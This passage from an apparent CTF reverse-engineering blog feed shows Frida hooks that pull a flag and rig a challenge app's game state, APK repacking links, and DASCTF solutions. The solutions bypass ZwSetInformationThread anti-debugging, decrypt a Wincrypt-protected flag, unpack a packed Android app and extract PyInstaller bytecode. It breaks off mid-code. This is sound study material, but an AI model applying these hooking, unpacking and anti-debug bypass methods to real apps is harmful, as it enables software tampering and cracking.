href="https://blog.csdn.net/u012717638/article/details/110118697">https://blog.csdn.net/u012717638/article/details/110118697</a></p><p><strong>示例</strong></p><p><a href="https://xz.aliyun.com/t/8211">https://xz.aliyun.com/t/8211</a></p><p><strong>Frida Hook so</strong></p><p><a href="https://blog.csdn.net/weixin_39190897/article/details/115582853">https://blog.csdn.net/weixin_39190897/article/details/115582853</a></p><p><a href="https://blog.csdn.net/weixin_38819889/article/details/122535920">https://blog.csdn.net/weixin_38819889/article/details/122535920</a></p><h2 id="Javascript编写"><a class="header-anchor" href="#Javascript编写">¶</a>Javascript编写</h2><p>以上面的代码为例</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Java.perform开始执行JavaScript脚本</span></span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>{</span><br><span class="line"><span class="comment">//Java.use指定要使用的类，click变量</span></span><br><span class="line">    <span class="keyword">var</span> click = Java.use(<span class="string">"com.example.clickme.MainActivity"</span>);</span><br><span class="line"><span class="comment">//new一个对象创建类，该类和click（也就是mainactivity）一致</span></span><br><span class="line">    <span class="keyword">var</span> run = click.$new();</span><br><span class="line">    <span class="keyword">var</span> returnvalue = run.getFlag();</span><br><span class="line"><span class="comment">//调用类中的方法，打印getFlag的返回值，也就是flag</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">""</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Flag: "</span> + returnvalue);</span><br><span class="line">  });</span><br></pre></td></tr></tbody></table></figure><h3 id="console"><a class="header-anchor" href="#console">¶</a>console</h3><p>打印内存中的值</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//指定so文件</span></span><br><span class="line"><span class="keyword">var</span> libc = Module.findBaseAddress(<span class="string">'libc.so'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(hexdump(libc, {</span><br><span class="line">  <span class="attr">offset</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">length</span>: <span class="number">64</span>,</span><br><span class="line">  <span class="attr">header</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">ansi</span>: <span class="literal">true</span></span><br><span class="line">}));</span><br></pre></td></tr></tbody></table></figure><h2 id="python-js"><a class="header-anchor" href="#python-js">¶</a>python+js</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">message, data</span>):</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">'type'</span>] == <span class="string">'send'</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"[*] {0}"</span>.<span class="built_in">format</span>(message[<span class="string">'payload'</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"><span class="comment">#js代码</span></span><br><span class="line">jscode = <span class="string">"""</span></span><br><span class="line"><span class="string">Java.perform(function () {</span></span><br><span class="line"><span class="string">    var MainActivity = Java.use('com.example.seccon2015.rock_paper_scissors.MainActivity');</span></span><br><span class="line"><span class="string">    MainActivity.onClick.implementation = function (v) {</span></span><br><span class="line"><span class="string">        send("Hook Start...");</span></span><br><span class="line"><span class="string">        this.onClick(v);</span></span><br><span class="line"><span class="string">        this.n.value = 0;</span></span><br><span class="line"><span class="string">        this.m.value = 2;</span></span><br><span class="line"><span class="string">        this.cnt.value = 999;</span></span><br><span class="line"><span class="string">        send("Success!")</span></span><br><span class="line"><span class="string">    }</span></span><br><span class="line"><span class="string">});</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment">#附加到usb设备，attach后面是进程名</span></span><br><span class="line">process = frida.get_usb_device().attach(<span class="string">'com.example.seccon2015.rock_paper_scissors'</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">'message'</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;Frida-Hook&lt;/p&gt;</summary>
    
    
    
    <category term="Android" scheme="https://gift1a.github.io/categories/Android/"/>
    
    
    <category term="Android" scheme="https://gift1a.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>安卓逆向-修改smali代码并打包</title>
    <link href="https://gift1a.github.io/2022/04/30/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91-%E4%BF%AE%E6%94%B9smali%E4%BB%A3%E7%A0%81%E5%B9%B6%E6%89%93%E5%8C%85/"/>
    <id>https://gift1a.github.io/2022/04/30/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91-%E4%BF%AE%E6%94%B9smali%E4%BB%A3%E7%A0%81%E5%B9%B6%E6%89%93%E5%8C%85/</id>
    <published>2022-04-30T00:43:46.000Z</published>
    <updated>2022-05-05T11:41:42.759Z</updated>
    
    <content type="html"><![CDATA[<p>修改smali代码并打包</p><span id="more"></span><p>安卓逆向-打包-重签名<br><a href="https://blog.csdn.net/syxsyfsyh/article/details/89056820">https://blog.csdn.net/syxsyfsyh/article/details/89056820</a><br><a href="https://www.jianshu.com/p/792a08d5452c">https://www.jianshu.com/p/792a08d5452c</a><br><a href="https://www.cnblogs.com/shuaiwu1108/p/13534044.html">https://www.cnblogs.com/shuaiwu1108/p/13534044.html</a><br>签名验证与反调试<br><a href="https://blog.csdn.net/weixin_39190897/article/details/121024165">https://blog.csdn.net/weixin_39190897/article/details/121024165</a></p><p>dex转smali<br><a href="https://www.jianshu.com/p/9bf9467c7c7e">https://www.jianshu.com/p/9bf9467c7c7e</a><br><a href="https://bitbucket.org/JesusFreke/smali/downloads/">https://bitbucket.org/JesusFreke/smali/downloads/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;修改smali代码并打包&lt;/p&gt;</summary>
    
    
    
    <category term="Android" scheme="https://gift1a.github.io/categories/Android/"/>
    
    
    <category term="Android" scheme="https://gift1a.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF-FATE-Reverse</title>
    <link href="https://gift1a.github.io/2022/04/23/DASCTF-FATE-Reverse/"/>
    <id>https://gift1a.github.io/2022/04/23/DASCTF-FATE-Reverse/</id>
    <published>2022-04-23T12:40:54.000Z</published>
    <updated>2022-04-24T07:53:15.696Z</updated>
    
    <content type="html"><![CDATA[<p>DASCTF-FATE-Reverse</p><span id="more"></span> <h1 id="0x00-Crackme"><a class="header-anchor" href="#0x00-Crackme">¶</a>0x00-Crackme</h1><h2 id="考点-v8"><a class="header-anchor" href="#考点-v8">¶</a>考点</h2><p>MFC逆向、反调试、Wincrypt</p><h2 id="分析-v8"><a class="header-anchor" href="#分析-v8">¶</a>分析</h2><p>看exe文件的图标是MFC，于是去网上搜了一下MFC逆向，发现了这篇文章</p><p><a href="https://blog.csdn.net/Sanky0u/article/details/81568483">https://blog.csdn.net/Sanky0u/article/details/81568483</a></p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650718980990.png" alt></p><p>1000和1001对应两个输入框</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650719074057.png" alt></p><p>能定位到输入框</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650719123440.png" alt></p><p>对函数交叉引用发现找不到，因为这里使用的是this指针调用（可能）</p><blockquote><p><strong>MFC主函数是WinMain</strong></p></blockquote><p>然后动调半天看晕了</p><p>字符串搜索回显的字符串Wrong，直接明文存储</p><p>如果下次有机会出这样的题一定把回显字符串加密（</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650719281899.png" alt></p><p>流程分析</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650719629400.png" alt></p><p>这里都是一些API函数，就不过多介绍了</p><h3 id="key加密"><a class="header-anchor" href="#key加密">¶</a>key加密</h3><p>关键的是</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650719692346.png" alt></p><p>不同的值对应了不同的加密</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650719799678.png" alt></p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650719826383.png" alt></p><p>所以就是将我们输入的key分为两个长度为四的字符串，然后分别进行MD5和SHA1加密</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650719927941.png" alt="最终的加密"></p><h3 id="flag加密"><a class="header-anchor" href="#flag加密">¶</a>flag加密</h3><p>先把整段key进行md5加密</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650720029530.png" alt></p><p>然后将加密后的key传入最终的加密函数中，生成MD5的哈希值，传入生成Key</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650720157885.png" alt></p><p>看到这个参数，查了一下</p><p><a href="https://docs.microsoft.com/zh-tw/windows/win32/seccrypto/alg-id?redirectedfrom=MSDN">https://docs.microsoft.com/zh-tw/windows/win32/seccrypto/alg-id?redirectedfrom=MSDN</a></p><p>发现对应AES-128，也就是生成AES-128的密钥</p><p>然后调用CryptEncrypt函数加密</p><h3 id="反调试-ZwSetInformationThread"><a class="header-anchor" href="#反调试-ZwSetInformationThread">¶</a>反调试-ZwSetInformationThread</h3><p>我们需要动态调试提取数据，但是在刚才的位置设置断点会发现输入后直接结束，应该是有反调试</p><p><a href="https://ctf-wiki.org/reverse/windows/anti-debug/zwsetinformationthread/">https://ctf-wiki.org/reverse/windows/anti-debug/zwsetinformationthread/</a></p><p>对比各种反调试和去IMPORT找导入函数，最终确定是ZwSetInformationThread</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650720722604.png" alt></p><p>反反调试在该文中也有介绍，就不再多说了</p><p>绕过后就可以提取数据进行解密了</p><h3 id="得到key"><a class="header-anchor" href="#得到key">¶</a>得到key</h3><p>MD5</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650761698008.png" alt></p><p>SHA1</p><p><a href="https://crackstation.net/">https://crackstation.net/</a></p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650762007404.png" alt></p><h3 id="解密flag"><a class="header-anchor" href="#解密flag">¶</a>解密flag</h3><p>这里直接提取数据拿去AES解密有问题（提取出来调用CryptDecrypt也不行），还是FallW1nd师傅强，想到直接模拟生成哈希值的过程，然后最后调用CryptDecrypt即可</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650762204848.png" alt></p><p>EXP如下</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wincrypt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    HCRYPTKEY phKey; <span class="comment">// [esp+Ch] [ebp-10h] BYREF</span></span><br><span class="line">    HCRYPTPROV phProv; <span class="comment">// [esp+10h] [ebp-Ch] BYREF</span></span><br><span class="line">    HCRYPTHASH phHash; <span class="comment">// [esp+14h] [ebp-8h] BYREF</span></span><br><span class="line">    BOOL retValue;</span><br><span class="line"></span><br><span class="line">    BYTE flag_data[<span class="number">0x104</span>] = { <span class="number">0x5B</span>, <span class="number">0x9C</span>, <span class="number">0xEE</span>, <span class="number">0xB2</span>, <span class="number">0x3B</span>, <span class="number">0xB7</span>, <span class="number">0xD7</span>, <span class="number">0x34</span>, <span class="number">0xF3</span>, <span class="number">0x1B</span>, <span class="number">0x75</span>, <span class="number">0x14</span>, <span class="number">0xC6</span>, <span class="number">0xB2</span>, <span class="number">0x1F</span>, <span class="number">0xE8</span>, <span class="number">0xDE</span>, <span class="number">0x33</span>, <span class="number">0x44</span>, <span class="number">0x74</span>, <span class="number">0x75</span>, <span class="number">0x1B</span>, <span class="number">0x47</span>, <span class="number">0x6A</span>, <span class="number">0xD4</span>, <span class="number">0x37</span>, <span class="number">0x51</span>, <span class="number">0x88</span>, <span class="number">0xFC</span>, <span class="number">0x67</span>, <span class="number">0xE6</span>, <span class="number">0x60</span>, <span class="number">0xDA</span>, <span class="number">0x0D</span>, <span class="number">0x58</span>, <span class="number">0x07</span>, <span class="number">0x81</span>, <span class="number">0x43</span>, <span class="number">0x53</span>, <span class="number">0xEA</span>, <span class="number">0x7B</span>, <span class="number">0x52</span>, <span class="number">0x85</span>, <span class="number">0x6C</span>, <span class="number">0x86</span>, <span class="number">0x65</span>, <span class="number">0xAF</span>, <span class="number">0xB4</span> };</span><br><span class="line">    BYTE keyBuf[] = { <span class="number">0x5c</span>,<span class="number">0x53</span>,<span class="number">0xa4</span>,<span class="number">0xa4</span>,<span class="number">0x1d</span>,<span class="number">0x52</span>,<span class="number">0x43</span>,<span class="number">0x7a</span>,<span class="number">0x9f</span>,<span class="number">0xa1</span>,<span class="number">0xe9</span>,<span class="number">0xc2</span>,<span class="number">0x6c</span>,<span class="number">0xa5</span>,<span class="number">0x90</span>,<span class="number">0x90</span> };</span><br><span class="line">    DWORD dwDataLen = <span class="number">0x10</span>;</span><br><span class="line">    DWORD dwBufLen = <span class="number">0x104</span>;</span><br><span class="line">    DWORD dwDataLen_2;</span><br><span class="line">    DWORD* pdwDataLen = &amp;dwDataLen_2;</span><br><span class="line">    *pdwDataLen = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    phProv = <span class="number">0</span>;</span><br><span class="line">    phHash = <span class="number">0</span>;</span><br><span class="line">    phKey = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    retValue = CryptAcquireContextA(&amp;phProv, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x18</span>u, <span class="number">0xF0000000</span>);</span><br><span class="line">    <span class="keyword">if</span> (retValue)</span><br><span class="line">    {</span><br><span class="line">        retValue = CryptCreateHash(phProv, <span class="number">0x8003</span>u, <span class="number">0</span>, <span class="number">0</span>, &amp;phHash);</span><br><span class="line">        <span class="keyword">if</span> (retValue)</span><br><span class="line">        {</span><br><span class="line">            retValue = CryptHashData(phHash, keyBuf, dwDataLen, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (retValue)</span><br><span class="line">            {</span><br><span class="line">                retValue = CryptDeriveKey(phProv, <span class="number">0x660E</span>u, phHash, <span class="number">1u</span>, &amp;phKey);</span><br><span class="line">                <span class="keyword">if</span> (retValue)</span><br><span class="line">                    retValue = CryptDecrypt(phKey, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, flag_data, pdwDataLen);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (phKey)</span><br><span class="line">        CryptDestroyKey(phKey);</span><br><span class="line">    <span class="keyword">if</span> (phHash)</span><br><span class="line">        CryptDestroyHash(phHash);</span><br><span class="line">    <span class="keyword">if</span> (phProv)</span><br><span class="line">        CryptReleaseContext(phProv, <span class="number">0</span>);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> retValue;</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="附录"><a class="header-anchor" href="#附录">¶</a>附录</h3><p>还有这种调用加密，有兴趣可以去看看-<a href="http://ctf.hsc2019.site/challenges#DRIVER-58">http://ctf.hsc2019.site/challenges#DRIVER-58</a></p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650762364038.png" alt></p><h1 id="0x01-FakePica"><a class="header-anchor" href="#0x01-FakePica">¶</a>0x01-FakePica</h1><h2 id="考点-v9"><a class="header-anchor" href="#考点-v9">¶</a>考点</h2><p>安卓加壳、AES</p><h2 id="分析-v9"><a class="header-anchor" href="#分析-v9">¶</a>分析</h2><p>hgame-week3-re也有脱壳，这里把工具链接贴一下</p><p><a href="https://github.com/CodingGay/BlackDex">https://github.com/CodingGay/BlackDex</a></p><p>具体分析加壳与脱壳直接看我之前写的文章</p><p><a href="https://gift1a.github.io/2022/02/13/hgame2022-week3-re/?highlight=%E6%A2%86">https://gift1a.github.io/2022/02/13/hgame2022-week3-re/?highlight=梆</a></p><h3 id="加密分析"><a class="header-anchor" href="#加密分析">¶</a>加密分析</h3><p>找到Mainactivity</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650762932688.png" alt></p><p>数据提取</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> content[] = {<span class="number">-114</span>, <span class="number">95</span>, <span class="number">-37</span>, <span class="number">127</span>, <span class="number">-110</span>, <span class="number">113</span>, <span class="number">41</span>, <span class="number">74</span>, <span class="number">40</span>, <span class="number">73</span>, <span class="number">19</span>, <span class="number">124</span>, <span class="number">-57</span>, <span class="number">-88</span>, <span class="number">39</span>, <span class="number">-116</span>, <span class="number">-16</span>, <span class="number">-75</span>, <span class="number">-3</span>, <span class="number">-45</span>, <span class="number">-73</span>, <span class="number">-6</span>, <span class="number">-104</span>, <span class="number">-6</span>, <span class="number">-78</span>, <span class="number">121</span>, <span class="number">110</span>, <span class="number">74</span>, <span class="number">-90</span>, <span class="number">-47</span>, <span class="number">-28</span>, <span class="number">-28</span>};</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> content1[] = {<span class="number">-40</span>, <span class="number">26</span>, <span class="number">95</span>, <span class="number">-49</span>, <span class="number">-40</span>, <span class="number">-123</span>, <span class="number">72</span>, <span class="number">-90</span>, <span class="number">-100</span>, <span class="number">-41</span>, <span class="number">122</span>, <span class="number">-4</span>, <span class="number">25</span>, <span class="number">-101</span>, <span class="number">-58</span>, <span class="number">116</span>};</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%X"</span>, content1[i] &amp; <span class="number">0xff</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>解密直接去在线网站即可</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650763024950.png" alt></p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650763086950.png" alt="get flag"></p><h1 id="0x02-奇怪的交易"><a class="header-anchor" href="#0x02-奇怪的交易">¶</a>0x02-奇怪的交易</h1><h2 id="考点-v10"><a class="header-anchor" href="#考点-v10">¶</a>考点</h2><p>ELF-python打包、算法</p><h2 id="分析-v10"><a class="header-anchor" href="#分析-v10">¶</a>分析</h2><p>还好加了Lu1u师傅，刚好看到</p><p><a href="https://lu1u.xyz/2022/03/28/RE_Challenge/">https://lu1u.xyz/2022/03/28/RE_Challenge/</a></p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650763204421.png" alt></p><blockquote><p><strong>objcopy --dump-section pydata=pydata.dump 1</strong></p><p><strong>sudo snap install pyinstxtractor</strong></p><p><strong>pyinstxtractor pydata.dump</strong></p></blockquote><p>得到pyc文件，修补好文件头发现uncompyle6不了（因为是3.10的），寄，只能嗯读python字节码</p><h3 id="翻译字节码"><a class="header-anchor" href="#翻译字节码">¶</a>翻译字节码</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cup <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">pub_key=[<span class="number">12702192797044914024075774649965354105344232304099465264316470282606351700311177624703682814557100043599414982439635470829841890299241342602374578366076034128412992290094164613120745611751102797279925764448133764246126488845600641524814194290745105708735258127757986238766868988676022258542038318776640732920027324986285887310132372524224961045858183153047991881042129131551711617627844146600513830709959185824512201669420128585170924683844128155435146399996585220865423125338735154727569986267948480523307784641442521735105741341230032585576300299944879647981670048377150556292280650846158185797588466680532743801893</span>,<span class="number">12680615221091469696163926483122992106481999501435284497098601343706982733487916553201934931961274845294041438909951977672521864927961654544622905443692482152403380984734291652023321187458458985625147422841102922314725726207365632256563373977251725785357590588556314671253970422319546403985257810950046085994573229162322957630767327089195523762665081311711474689269184996318744510300057603532953644164998953897411177604349567514705039306693117602798453972917348902600111420473965929048876821563646206875034926505783009957256212261250539005023918242209009676914632796839852778318989278092929214021282438144809708279435</span>]</span><br><span class="line">pp=[<span class="number">0</span>]</span><br><span class="line">dd=[<span class="number">54</span>,<span class="number">54</span>,<span class="number">54</span>,<span class="number">54</span>]</span><br><span class="line">oo=[<span class="number">3532577106</span>, <span class="number">1472742623</span>, <span class="number">3642468664</span>, <span class="number">4193500461</span>, <span class="number">2398676029</span>, <span class="number">617653972</span>, <span class="number">1474514999</span>, <span class="number">1471783658</span>, <span class="number">1012864704</span>, <span class="number">3615627536</span>, <span class="number">993855884</span>, <span class="number">438456717</span>, <span class="number">3358938551</span>, <span class="number">3906991208</span>, <span class="number">198959101</span>, <span class="number">3317190635</span>, <span class="number">3656923078</span>, <span class="number">613157871</span>, <span class="number">2398768861</span>, <span class="number">97286225</span>, <span class="number">2336972940</span>, <span class="number">1471645170</span>, <span class="number">3233163154</span>, <span class="number">583597118</span>, <span class="number">2863776301</span>, <span class="number">3183067750</span>, <span class="number">1384330715</span>, <span class="number">2929694742</span>, <span class="number">3522431804</span>, <span class="number">2181488067</span>, <span class="number">3303062236</span>, <span class="number">3825712422</span>, <span class="number">145643141</span>, <span class="number">2148976293</span>, <span class="number">2940910035</span>, <span class="number">506798154</span>, <span class="number">994590281</span>, <span class="number">2231904779</span>, <span class="number">3389770074</span>, <span class="number">2814269052</span>, <span class="number">1105937096</span>, <span class="number">1789727804</span>, <span class="number">3757028753</span>, <span class="number">2469686072</span>, <span class="number">1162286478</span>, <span class="number">680814033</span>, <span class="number">2934024098</span>, <span class="number">2162521262</span>, <span class="number">4048876895</span>, <span class="number">2121620700</span>, <span class="number">4240287315</span>, <span class="number">2391811140</span>, <span class="number">3396611602</span>, <span class="number">3091349617</span>, <span class="number">3031523010</span>, <span class="number">2486958601</span>, <span class="number">3164065171</span>, <span class="number">1285603712</span>, <span class="number">798920280</span>, <span class="number">2337813135</span>, <span class="number">4186055520</span>, <span class="number">3523024366</span>, <span class="number">1077514121</span>, <span class="number">1436444106</span>, <span class="number">2731983230</span>, <span class="number">1507202797</span>, <span class="number">500756149</span>, <span class="number">198754565</span>, <span class="number">2382448647</span>, <span class="number">880454148</span>, <span class="number">1970517398</span>, <span class="number">3217485349</span>, <span class="number">1161840191</span>, <span class="number">560498076</span>, <span class="number">1782600856</span>, <span class="number">2643721918</span>, <span class="number">1285196205</span>, <span class="number">788797746</span>, <span class="number">1195724574</span>, <span class="number">4061612551</span>, <span class="number">103427523</span>, <span class="number">2502688387</span>, <span class="number">4147162188</span>, <span class="number">617564657</span>, <span class="number">978211984</span>, <span class="number">1781482121</span>, <span class="number">2205798970</span>, <span class="number">3939973102</span>, <span class="number">3826603515</span>, <span class="number">659557668</span>, <span class="number">2582884932</span>, <span class="number">1561884856</span>, <span class="number">2217488804</span>, <span class="number">1189296962</span>, <span class="number">169145316</span>, <span class="number">2781742156</span>, <span class="number">1323893433</span>, <span class="number">824667876</span>, <span class="number">408202876</span>, <span class="number">3759637634</span>, <span class="number">4094868412</span>, <span class="number">1508996065</span>, <span class="number">162419237</span>, <span class="number">3732146944</span>, <span class="number">3083560189</span>, <span class="number">3955940127</span>, <span class="number">2393776934</span>, <span class="number">2470191468</span>, <span class="number">3620861513</span>, <span class="number">481927014</span>, <span class="number">2756226070</span>, <span class="number">3154651143</span>, <span class="number">1261069441</span>, <span class="number">2063238535</span>, <span class="number">2222237213</span>, <span class="number">101459755</span>, <span class="number">3159774417</span>, <span class="number">1721190841</span>, <span class="number">1078395785</span>, <span class="number">176506553</span>, <span class="number">3552913423</span>, <span class="number">1566142515</span>, <span class="number">1938949000</span>, <span class="number">1499289517</span>, <span class="number">3315102456</span>, <span class="number">829714860</span>, <span class="number">3843359394</span>, <span class="number">952932374</span>, <span class="number">1283577465</span>, <span class="number">2045007203</span>, <span class="number">3957761944</span>, <span class="number">3767891405</span>, <span class="number">2917089623</span>, <span class="number">3296133521</span>, <span class="number">482297421</span>, <span class="number">1734231412</span>, <span class="number">3670478932</span>, <span class="number">2575334979</span>, <span class="number">2827842737</span>, <span class="number">3413631016</span>, <span class="number">1533519803</span>, <span class="number">4008428470</span>, <span class="number">3890643173</span>, <span class="number">272960248</span>, <span class="number">317508587</span>, <span class="number">3299937500</span>, <span class="number">2440520601</span>, <span class="number">27470488</span>, <span class="number">1666674386</span>, <span class="number">1737927609</span>, <span class="number">750987808</span>, <span class="number">2385923471</span>, <span class="number">2694339191</span>, <span class="number">562925334</span>, <span class="number">2206035395</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ll</span>():</span></span><br><span class="line">    pub_key = [</span><br><span class="line">        <span class="number">12702192797044914024075774649965354105344232304099465264316470282606351700311177624703682814557100043599414982439635470829841890299241342602374578366076034128412992290094164613120745611751102797279925764448133764246126488845600641524814194290745105708735258127757986238766868988676022258542038318776640732920027324986285887310132372524224961045858183153047991881042129131551711617627844146600513830709959185824512201669420128585170924683844128155435146399996585220865423125338735154727569986267948480523307784641442521735105741341230032585576300299944879647981670048377150556292280650846158185797588466680532743801893</span>,</span><br><span class="line">        <span class="number">12680615221091469696163926483122992106481999501435284497098601343706982733487916553201934931961274845294041438909951977672521864927961654544622905443692482152403380984734291652023321187458458985625147422841102922314725726207365632256563373977251725785357590588556314671253970422319546403985257810950046085994573229162322957630767327089195523762665081311711474689269184996318744510300057603532953644164998953897411177604349567514705039306693117602798453972917348902600111420473965929048876821563646206875034926505783009957256212261250539005023918242209009676914632796839852778318989278092929214021282438144809708279435</span>]</span><br><span class="line">    flag=<span class="built_in">input</span>()</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    m=libnum.s2n(flag)<span class="comment">#字符串转为数字</span></span><br><span class="line">    c=<span class="built_in">str</span>(<span class="built_in">pow</span>(m,pub_key[<span class="number">1</span>],pub_key[<span class="number">0</span>]))<span class="comment">#简单算法并且进行转为字符串</span></span><br><span class="line">    <span class="keyword">if</span> i&lt;<span class="built_in">len</span>(c):</span><br><span class="line">        kk=<span class="number">0</span></span><br><span class="line">        <span 